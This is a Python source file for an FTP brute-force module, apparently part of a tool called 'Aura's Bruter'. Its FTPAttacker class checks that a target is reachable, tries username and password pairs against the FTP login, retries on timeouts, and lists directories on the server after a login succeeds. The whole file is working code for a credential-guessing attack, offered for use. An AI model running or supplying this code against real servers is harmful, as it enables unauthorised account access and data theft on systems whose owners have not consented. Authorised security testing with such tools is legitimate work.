#!/usr/bin/env python3
"""
Aura's Bruter - FTP Attack Module
FTP brute force using ftplib with robust error handling
"""

import ftplib
import socket
from typing import Optional, Dict, Any, Tuple
from dataclasses import dataclass


@dataclass
class FTPResult:
    """Result of an FTP connection attempt."""
    success: bool
    username: str
    password: str
    error: Optional[str] = None
    error_type: Optional[str] = None  # dns, refused, timeout, auth, protocol, unknown
    welcome: Optional[str] = None


@dataclass
class ValidationResult:
    """Result of target validation."""
    valid: bool
    error: Optional[str] = None
    error_type: Optional[str] = None
    details: Optional[Dict[str, Any]] = None


class FTPAttacker:
    """
    FTP brute force attack module using ftplib.
    Includes robust error handling and pre-validation.
    """
    
    def __init__(
        self,
        host: str,
        port: int = 21,
        timeout: float = 10.0,
        max_retries: int = 3
    ):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_retries = max_retries
        self._welcome = None
        self._validated = False
    
    def validate_target(self) -> ValidationResult:
        """
        Validate target before starting attack.
        Checks DNS resolution, port reachability, and FTP handshake.
        
        Returns:
            ValidationResult with status and error details
        """
        # Step 1: DNS resolution
        try:
            socket.gethostbyname(self.host)
        except socket.gaierror as e:
            return ValidationResult(
                valid=False,
                error=f"DNS resolution failed: {self.host}",
                error_type="dns",
                details={"exception": str(e)}
            )
        
        # Step 2: TCP connection check
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, self.port))
            
            if result != 0:
                return ValidationResult(
                    valid=False,
                    error=f"Port {self.port} is closed or filtered",
                    error_type="refused",
                    details={"connect_result": result}
                )
        except socket.timeout:
            return ValidationResult(
                valid=False,
                error=f"Connection timeout ({self.timeout}s)",
                error_type="timeout"
            )
        except ConnectionRefusedError:
            return ValidationResult(
                valid=False,
                error=f"Connection refused on port {self.port}",
                error_type="refused"
            )
        except socket.error as e:
            return ValidationResult(
                valid=False,
                error=f"Network error: {e}",
                error_type="network",
                details={"exception": str(e)}
            )
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        
        # Step 3: FTP protocol handshake
        ftp = None
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.timeout)
            welcome = ftp.getwelcome()
            self._welcome = welcome
            self._validated = True
            
            return ValidationResult(
                valid=True,
                details={
                    "welcome": welcome,
                    "host": self.host,
                    "port": self.port
                }
            )
        except ftplib.error_perm as e:
            return ValidationResult(
                valid=False,
                error=f"FTP permission error: {e}",
                error_type="protocol"
            )
        except ftplib.error_temp as e:
            return ValidationResult(
                valid=False,
                error=f"FTP temporary error: {e}",
                error_type="protocol"
            )
        except socket.timeout:
            return ValidationResult(
                valid=False,
                error="FTP handshake timeout",
                error_type="timeout"
            )
        except Exception as e:
            return ValidationResult(
                valid=False,
                error=f"FTP connection error: {e}",
                error_type="unknown",
                details={"exception": str(e)}
            )
        finally:
            if ftp:
                try:
                    ftp.quit()
                except Exception:
                    pass
    
    def check_port_open(self) -> bool:
        """Check if the FTP port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def get_welcome(self) -> Optional[str]:
        """Get the FTP server welcome message."""
        if self._welcome:
            return self._welcome
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.timeout)
            self._welcome = ftp.getwelcome()
            ftp.quit()
            return self._welcome
        except Exception:
            return None
    
    def try_credentials(self, username: str, password: str) -> FTPResult:
        """
        Try to authenticate with the given credentials.
        
        Args:
            username: FTP username
            password: FTP password
            
        Returns:
            FTPResult with success status and details
        """
        for attempt in range(self.max_retries):
            ftp = ftplib.FTP()
            
            try:
                ftp.connect(self.host, self.port, timeout=self.timeout)
                welcome = ftp.getwelcome()
                
                ftp.login(username, password)
                
                # Success!
                try:
                    ftp.quit()
                except Exception:
                    pass
                    
                return FTPResult(
                    success=True,
                    username=username,
                    password=password,
                    welcome=welcome
                )
                
            except ftplib.error_perm as e:
                error_msg = str(e)
                # 530 = Login incorrect
                if "530" in error_msg:
                    return FTPResult(
                        success=False,
                        username=username,
                        password=password,
                        error="Authentication failed",
                        error_type="auth"
                    )
                # Other permission errors
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"FTP error: {error_msg}",
                    error_type="protocol"
                )
                
            except ftplib.error_temp as e:
                # Temporary error, might retry
                if attempt < self.max_retries - 1:
                    continue
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Temporary error: {e}",
                    error_type="protocol"
                )
            
            except socket.gaierror as e:
                # DNS error during attack (shouldn't happen if validated)
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"DNS error: {e}",
                    error_type="dns"
                )
                
            except socket.timeout:
                if attempt < self.max_retries - 1:
                    continue
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Connection timeout",
                    error_type="timeout"
                )
            
            except ConnectionRefusedError:
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error="Connection refused",
                    error_type="refused"
                )
                
            except socket.error as e:
                if attempt < self.max_retries - 1:
                    continue
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Socket error: {e}",
                    error_type="network"
                )
                
            except Exception as e:
                return FTPResult(
                    success=False,
                    username=username,
                    password=password,
                    error=f"Unexpected error: {e}",
                    error_type="unknown"
                )
            
            finally:
                try:
                    ftp.quit()
                except Exception:
                    pass
        
        return FTPResult(
            success=False,
            username=username,
            password=password,
            error="Max retries exceeded",
            error_type="timeout"
        )
    
    def list_directory(self, username: str, password: str, path: str = "/") -> Optional[list]:
        """
        List directory contents after successful authentication.
        
        Returns:
            List of files/directories or None if failed
        """
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, self.port, timeout=self.timeout)
            ftp.login(username, password)
            
            files = ftp.nlst(path)
            ftp.quit()
            return files
            
        except Exception:
            return None
    
    def get_server_info(self) -> dict:
        """Get information about the FTP server."""
        # Run validation to get comprehensive info
        validation = self.validate_target()
        
        return {
            "host": self.host,
            "port": self.port,
            "welcome": self._welcome or self.get_welcome(),
            "port_open": validation.valid or self.check_port_open(),
            "validation": {
                "valid": validation.valid,
                "error": validation.error,
                "error_type": validation.error_type
            }
        }
    
    @staticmethod
    def get_error_message(error_type: str) -> str:
        """Get user-friendly error message for error type."""
        messages = {
            "dns": "Host not found. Check the hostname/IP address.",
            "refused": "Connection refused. Check if FTP server is running.",
            "timeout": "Connection timed out. Host may be unreachable or firewalled.",
            "auth": "Authentication failed. Invalid credentials.",
            "protocol": "FTP protocol error. Server may not support standard FTP.",
            "network": "Network error. Check your connection.",
            "unknown": "Unknown error occurred."
        }
        return messages.get(error_type, messages["unknown"])


if __name__ == "__main__":
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    
    console.print("[yellow]FTP Attack Module - Demo Mode[/yellow]\n")
    
    # Test validation
    console.print("[cyan]Testing target validation...[/cyan]")
    
    attacker = FTPAttacker("127.0.0.1", 21)
    result = attacker.validate_target()
    
    if result.valid:
        console.print(Panel(f"[green]Target valid![/green]\nWelcome: {result.details.get('welcome', 'N/A')}"))
    else:
        console.print(Panel(f"[red]Target invalid[/red]\nError: {result.error}\nType: {result.error_type}"))
    
    console.print("\n")
    
    table = Table(title="FTPAttacker Methods")
    table.add_column("Method", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("validate_target()", "Pre-check DNS, port, and FTP handshake")
    table.add_row("check_port_open()", "Check if FTP port is accessible")
    table.add_row("get_welcome()", "Retrieve FTP server welcome message")
    table.add_row("try_credentials(user, pass)", "Attempt authentication")
    table.add_row("list_directory(user, pass, path)", "List directory after auth")
    table.add_row("get_server_info()", "Get comprehensive server info")
    
    console.print(table)
